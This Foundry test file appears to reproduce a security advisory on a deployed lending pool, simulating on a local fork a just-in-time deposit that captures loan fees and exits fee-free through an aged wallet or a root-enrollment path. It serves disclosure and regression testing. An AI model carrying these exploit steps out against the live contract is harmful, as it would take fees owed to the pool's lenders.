// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev The deployed CreditPoolV2 as a lender, a root and a borrower see it. A local interface: importing
///      src/CreditPoolV2.sol would put this file into the pool's via-IR job (foundry.toml `compilation_restrictions`).
interface IPool2899 {
    struct Consent {
        uint256 agentId;
        uint256 sponsorId;
        address owner;
        uint256 maxPremiumBps;
        uint256 nonce;
        uint256 deadline;
    }

    struct Loan {
        uint256 agentId;
        uint256 sponsorId;
        uint256 principal;
        uint256 fee;
        uint256 sponsorCut;
        uint256 reserveCut;
        uint256 premium;
        address owner;
        uint64 issuedAt;
        uint64 dueAt;
        uint64 defaultableAt;
        uint64 minScoreTerm;
        uint64 closedAt;
        uint8 status;
    }

    function usdg() external view returns (IERC20);
    function registry() external view returns (address);
    function deposit(uint256 assets, address receiver, uint256 minShares) external returns (uint256 minted);
    function withdraw(uint256 shares, address receiver) external returns (uint256 out);
    function shares(address who) external view returns (uint256);
    function lastDepositAt(address who) external view returns (uint64);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalShares() external view returns (uint256);
    function MIN_HOLD() external view returns (uint64);
    function EARLY_EXIT_BPS() external view returns (uint256);
    function pausedUntil() external view returns (uint64);
    function enrollRoot(uint256 rootId, uint256 assets) external;
    function unlock(uint256 rootId, uint256 shares, address to) external returns (uint256 assets);
    function rootShares(uint256 rootId) external view returns (uint256);
    function nonces(uint256 agentId) external view returns (uint256);
    function consentDigest(Consent calldata c) external view returns (bytes32);
    function vouchWithConsent(
        uint256 sponsorId,
        uint256 agentId,
        uint256 amount,
        uint256 premiumBps,
        Consent calldata c,
        bytes calldata sig
    ) external;
    function borrow(uint256 agentId, uint256 amount, uint64 term, address to, uint256 maxFee)
        external
        returns (uint256 loanId);
    function repay(uint256 loanId, uint256 expectedAgentId, uint256 maxDue) external;
    function markDefault(uint256 loanId) external;
    function getLoan(uint256 loanId) external view returns (Loan memory);
}

interface IRegister2899 {
    function register(string calldata agentURI) external returns (uint256 agentId);
}

/// @title GHSA-2899-mwvp-gpvc on the deployed pool (fork of chain 4663)
/// @notice test/Pvr2899.t.sol's flows on the live CreditPoolV2 0x2812…DE21, its bytecode, parameters and size, around
///         a fee-landing event this test creates (a fresh root's 500 USDG, 30-day loan to a fresh agent, so no live
///         loan, hook or wallet is touched): the aged wallet's JIT leaves fee-free, a fresh wallet pays 0.5% and ends
///         below its deposit, and the root door takes the same with no fee, within the event's landed fee.
///
///   FORK_RPC=<rpc> forge test --match-contract Pvr2899ForkTest -vv
/// Without FORK_RPC every test is skipped. Nothing is sent: every write is local to forge's fork.
contract Pvr2899ForkTest is Test {
    IPool2899 constant POOL = IPool2899(0x281210097f0de7A8FB6F87310AF0f089c9C8DE21);
    uint256 constant USDG = 1e6;
    uint256 constant ANCHOR = 100 * USDG;
    uint256 constant JIT = 5_000 * USDG;
    uint256 constant AGE = 400 days;
    uint256 constant LOAN = 500 * USDG;

    bool forked;
    IERC20 usdg;
    IRegister2899 reg;
    address attacker = makeAddr("pvr2899-aged-wallet");
    address fresh = makeAddr("pvr2899-fresh-wallet");
    address jitRoot = makeAddr("pvr2899-jit-root");
    address backer = makeAddr("pvr2899-backer");
    uint256 constant AGENT_PK = 0x2899;
    address agentOwner = vm.addr(AGENT_PK);
    uint256 t0;

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC", string(""));
        if (bytes(rpc).length == 0) return;
        uint256 at = vm.envOr("FORK_BLOCK", uint256(0));
        if (at == 0) vm.createSelectFork(rpc);
        else vm.createSelectFork(rpc, at);
        forked = true;
        usdg = POOL.usdg();
        reg = IRegister2899(POOL.registry());
        assertLt(POOL.pausedUntil(), block.timestamp, "the pool takes deposits");
        address[5] memory who = [attacker, fresh, jitRoot, backer, agentOwner];
        for (uint256 i = 0; i < who.length; i++) {
            deal(address(usdg), who[i], 1_000_000 * USDG);
            vm.prank(who[i]);
            usdg.approve(address(POOL), type(uint256).max);
        }
        t0 = block.timestamp;
        vm.prank(attacker);
        POOL.deposit(ANCHOR, attacker, 0);
    }

    modifier onFork() {
        if (!forked) vm.skip(true);
        _;
    }

    enum Door {
        AnchorOnly,
        AgedLender,
        FreshLender,
        Root
    }

    function _maxLoanDue() internal returns (uint256 loanId) {
        vm.warp(t0 + AGE - 30 days);
        vm.startPrank(backer);
        uint256 rootId = reg.register("pvr2899-backer");
        POOL.enrollRoot(rootId, LOAN + 100 * USDG);
        vm.stopPrank();
        vm.prank(agentOwner);
        uint256 agentId = reg.register("pvr2899-agent");
        IPool2899.Consent memory c = IPool2899.Consent({
            agentId: agentId,
            sponsorId: rootId,
            owner: agentOwner,
            maxPremiumBps: 0,
            nonce: POOL.nonces(agentId),
            deadline: block.timestamp + 1 days
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(AGENT_PK, POOL.consentDigest(c));
        vm.prank(backer);
        POOL.vouchWithConsent(rootId, agentId, LOAN, 0, c, abi.encodePacked(r, s, v));
        vm.prank(agentOwner);
        loanId = POOL.borrow(agentId, LOAN, 30 days, agentOwner, type(uint256).max);
        vm.warp(t0 + AGE);
    }

    function _price() internal view returns (uint256) {
        return POOL.totalAssets() * 1e18 / POOL.totalShares();
    }

    function _jit(Door door, uint256 d, bool viaDefault) internal returns (uint256 fee, int256 gain, uint256 landed) {
        uint256 loanId = _maxLoanDue();
        IPool2899.Loan memory l = POOL.getLoan(loanId);
        landed = viaDefault ? l.fee : l.fee - l.sponsorCut - l.premium - l.reserveCut;
        if (viaDefault) vm.warp(l.defaultableAt + 1);
        address who = door == Door.FreshLender ? fresh : door == Door.Root ? jitRoot : attacker;
        uint256 before = usdg.balanceOf(who);
        uint256 rootId;
        uint256 priceBefore = _price();
        vm.startPrank(who);
        if (door == Door.AgedLender || door == Door.FreshLender) POOL.deposit(d, who, 0);
        if (door == Door.Root) {
            rootId = reg.register("pvr2899-jit-root");
            POOL.enrollRoot(rootId, d);
        }
        vm.stopPrank();
        if (viaDefault) {
            vm.prank(makeAddr("anyone"));
            POOL.markDefault(loanId);
        } else {
            vm.prank(agentOwner);
            POOL.repay(loanId, l.agentId, type(uint256).max);
        }
        vm.startPrank(who);
        if (door == Door.Root) {
            POOL.unlock(rootId, POOL.rootShares(rootId), who);
        } else {
            uint256 sh = POOL.shares(who);
            uint256 assets = POOL.convertToAssets(sh);
            fee = assets - POOL.withdraw(sh, who);
        }
        vm.stopPrank();
        gain = int256(usdg.balanceOf(who)) - int256(before);
        if (door == Door.AgedLender || door == Door.AnchorOnly) gain -= int256(ANCHOR);
        assertGe(_price(), priceBefore, "the share price never falls");
    }

    function _check(string memory what, bool viaDefault) internal {
        uint256 s = vm.snapshotState();
        (, int256 anchorOnly, uint256 landed) = _jit(Door.AnchorOnly, 0, viaDefault);
        vm.revertToState(s);
        (uint256 feeAged, int256 aged,) = _jit(Door.AgedLender, JIT, viaDefault);
        vm.revertToState(s);
        (uint256 feeFresh, int256 freshGain,) = _jit(Door.FreshLender, JIT, viaDefault);
        vm.revertToState(s);
        (, int256 root,) = _jit(Door.Root, JIT, viaDefault);
        vm.revertToState(s);
        emit log_string(what);
        emit log_named_decimal_uint("  live totalAssets() at the fork (USDG)             ", POOL.totalAssets(), 6);
        emit log_named_decimal_int("  anchor alone (100 USDG aged 400 d), its own share  ", anchorOnly, 6);
        emit log_named_decimal_int("  aged wallet + 5,000 JIT, fee-free exit             ", aged, 6);
        emit log_named_decimal_int("  fresh wallet, same JIT, pays the 0.5% exit fee     ", freshGain, 6);
        emit log_named_decimal_uint("    its exit fee                                    ", feeFresh, 6);
        emit log_named_decimal_int("  fresh root, same JIT, enrollRoot -> unlock (F-2)  ", root, 6);
        emit log_named_decimal_uint("  fee the event lands on the shares                 ", landed, 6);
        assertEq(feeAged, 0, "aged wallet: no early-exit fee on 0-second-old money");
        assertEq(feeFresh > 0 && freshGain < 0, true, "fresh wallet: pays the fee and loses money");
        assertGt(aged - anchorOnly, 0, "the JIT money gains");
        assertGt(root, 0, "root door: fee captured, no exit fee (F-2)");
        assertLe(aged, root + anchorOnly + 2, "the aged wallet takes no more than the root door plus its own anchor");
        assertLe(uint256(aged), landed, "within the event's landed fee");
    }

    function test_fork_2899_aroundRepay() public onFork {
        _check("deployed pool, around repay(500 USDG, 30 d): gain in USDG", false);
    }

    function test_fork_2899_aroundMarkDefault() public onFork {
        _check("deployed pool, around markDefault(500 USDG, 30 d): gain in USDG", true);
    }
}
